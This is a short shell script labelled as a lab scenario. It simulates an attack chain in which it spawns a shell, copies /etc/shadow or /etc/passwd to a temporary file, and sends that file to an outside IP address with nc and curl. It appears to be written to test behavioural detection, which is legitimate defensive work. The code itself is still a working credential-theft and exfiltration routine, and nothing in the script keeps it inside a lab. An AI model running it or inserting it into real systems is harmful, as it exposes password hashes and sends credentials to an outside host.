#!/bin/sh
# Lab Scenario 1: Shell-to-Exfiltration Behavioral Chain Attack
# Simulates: Interactive shell spawn -> sensitive credential access -> outbound exfil connection

echo "[*] Step 1: Launching interactive shell..."
/bin/sh -c '
    echo "[*] Step 2: Accessing sensitive credentials (/etc/shadow)..."
    cat /etc/shadow > /tmp/stolen_creds 2>/dev/null || cat /etc/passwd > /tmp/stolen_creds

    echo "[*] Step 3: Establishing outbound connection to exfiltrate data..."
    nc -w 2 203.0.113.10 443 < /tmp/stolen_creds 2>/dev/null || \
    curl -s --connect-timeout 2 http://203.0.113.10:443 -d @/tmp/stolen_creds 2>/dev/null || true
'

echo "[+] Scenario 1 complete."
